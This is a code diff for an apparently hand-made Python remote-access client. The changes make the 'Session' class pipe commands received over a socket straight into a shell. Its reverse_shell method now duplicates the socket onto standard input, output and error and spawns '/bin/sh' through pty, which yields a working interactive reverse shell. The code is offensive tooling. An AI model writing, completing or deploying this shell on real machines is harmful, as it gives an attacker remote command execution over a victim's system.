@@ -2,6 +2,8 @@ import socket
 import subprocess
 import json
 import select
+import pty
+import os
 
 BUFFER_SIZE = 4096
 MESSAGE = 'echo Hola, mundo!'
@@ -35,31 +37,25 @@ class Session():
                         output = self.exec_internal_cmd()
                     else:
                         output = self.exec_cmd()
-                    self.socket.sendall(output.stdout)
+                    # self.socket.sendall(output.stdout)
 
     def exec_internal_cmd(self):
         print("InternalCMD")
         if self.cmd == "exit":
-            output = subprocess.CompletedProcess()
-            output.returncode = 0
-            output.stderr = None
-            output.stdout = "Bye"
-            return output
+            msg = "Bye"
+            data = msg.encode()
+            self.socket.sendall(data)
             self.socket.close()
         elif self.cmd == "whoami":
-            output = subprocess.CompletedProcess()
-            output.returncode = 0
-            output.stderr = None
-            output.stdout = "\033[31m;t4LoN }>->\033[31m;"
-            return output
+            msg = "\033[31m;t4LoN }>->\033[31m;"
+            data = msg.encode()
+            self.socket.sendall(data)
 
     def exec_cmd(self):
         print("comando: ", self.cmd)
-        output = subprocess.run(self.cmd, stdout=subprocess.PIPE,
-                                stderr=subprocess.PIPE, stdin=subprocess.PIPE,
+        subprocess.run(self.cmd, stdout=self.socket.fileno(),
+                                stderr=self.socket.fileno(), stdin=self.socket.fileno(),
                                 shell=True)
-        print("salida: ", output)
-        return output
 
     def recv_cmd(self):
         self.chunks = []
@@ -74,10 +70,9 @@ class Session():
 
 
     def reverse_shell(self):
-        self.stdout = self.sock.makefile(mode='wb')
-        self.stderr = self.sock.makefile(mode='wb')
-        self.stdin  = self.sock.makefile(mode='rb')
-        subprocess.run(stderr=self.stderr, stdin=self.stdin, stdout=self.stdout)
+        # subprocess.run(["/bin/sh"], stdin=self.socket.fileno(), stdout=self.socket.fileno(), stderr=self.socket.fileno())
+        [os.dup2(self.socket.fileno(),fd) for fd in (0,1,2)]
+        pty.spawn("/bin/sh")
 
     def connect(self): 
         try:
